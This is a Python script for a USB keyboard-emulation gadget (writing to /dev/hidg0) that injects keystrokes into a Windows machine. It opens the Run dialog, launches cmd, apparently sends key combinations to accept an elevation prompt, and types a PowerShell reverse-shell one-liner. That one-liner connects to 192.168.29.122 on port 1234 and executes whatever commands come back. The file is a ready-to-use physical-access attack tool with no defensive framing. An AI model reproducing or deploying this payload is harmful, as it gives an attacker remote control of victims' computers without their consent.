#!/usr/bin/env python3
NULL_CHAR = chr(0)
import time
time.sleep(2)
key_mapping = {
    'a': chr(4), 
    'b': chr(5), 
    'c': chr(6),
    'd': chr(7), 
    'e': chr(8),
    'f': chr(9), 
    'g': chr(10),
    'h': chr(11),
    'i': chr(12), 
    'j': chr(13),
    'k': chr(14), 
    'l': chr(15),
    'm': chr(16), 
    'n': chr(17),
    'o': chr(18),
    'p': chr(19),
    'q': chr(20),
    'r': chr(21),
    's': chr(22), 
    't': chr(23),
    'u': chr(24),
    'v': chr(25), 
    'w': chr(26), 
    'x': chr(27), 
    'y': chr(28), 
    'z': chr(29),
    '1': chr(30),
    '2': chr(31),
    '3': chr(32), 
    '4': chr(33),
    '5': chr(34),
    '6': chr(35),
    '7': chr(36), 
    '8': chr(37),
    '9': chr(38),
    '0': chr(39),
    ' ': chr(44), 
    '-': chr(45), 
    '=': chr(46), 
    '[': chr(47), 
    ']': chr(48),
    '\\': chr(49), 
    ';': chr(51), 
    "'": chr(52), 
    '`': chr(53),
    ',': chr(54), 
    '.': chr(55), 
    '/': chr(56), 
    'Return': chr(40),
    'ESCAPE': chr(41),
    'DELETE': chr(42),
    'Tab': chr(43),
    'Spacebar': chr(44)
}
shifted_keys={'A': chr(4), 'B': chr(5),'C': chr(6),
              'E': chr(8), 'F': chr(9), 'G': chr(10),
              'H': chr(11),'I': chr(12), 'J': chr(13),
              'K': chr(14), 'L': chr(15), 'M': chr(16), 
              'N': chr(17), 'O': chr(18), '|':chr(49),
              'P': chr(19), 'Q': chr(20), 'R': chr(21),
              'S': chr(22), 'T': chr(23), 'U': chr(24),
              'V': chr(25), 'W': chr(26), 'X': chr(27),
              'Y': chr(28), 'Z': chr(29), '!': chr(30),
              '@': chr(31), '#': chr(32), '$': chr(33),
              '%': chr(34), '^': chr(35), '&': chr(36),
              '*': chr(37), '(': chr(38), ')': chr(39), 
              '_': chr(45), '+': chr(46), '{': chr(47),
              '}': chr(48), 'Sel': chr(49), ':': chr(51), 
              '"': chr(52), '`': chr(53), '<': chr(54),   
              '>': chr(55), '?': chr(56), 'D': chr(7)
              }

def write_report(report):
    with open('/dev/hidg0', 'rb+') as fd:
        fd.write(report.encode())

def type_text(text):
    for char in text:
        if char in key_mapping:
            # Press key
            write_report(NULL_CHAR*2 + key_mapping[char] + NULL_CHAR*5)
            # Release key
            write_report(NULL_CHAR*8)
        else:
            # Press key
            write_report(chr(32)+NULL_CHAR+shifted_keys[char]+ NULL_CHAR*5)
            # Release key
            write_report(NULL_CHAR*8)
        # Sleep for some time to prevent inaccuracy.
        time.sleep(.001)

# Payload
command = r'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.29.122',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''
# Hid for Win key + R
write_report(chr(8) + NULL_CHAR + chr(21) + NULL_CHAR*5)
# Release keys
write_report(NULL_CHAR*8)
# Sleep for 0.5 seconds
time.sleep(0.5)
# Type cmd
type_text("cmd")

write_report(chr(224) +NULL_CHAR+ chr(32) + chr(40) + NULL_CHAR*5)
# Release keys
write_report(NULL_CHAR*8)
time.sleep(0.8)
write_report(chr(0b00000100) +NULL_CHAR+ chr(28) + NULL_CHAR*5)
write_report(NULL_CHAR*8)
time.sleep(0.5)
type_text(command)
write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
# Release keys
write_report(NULL_CHAR*8)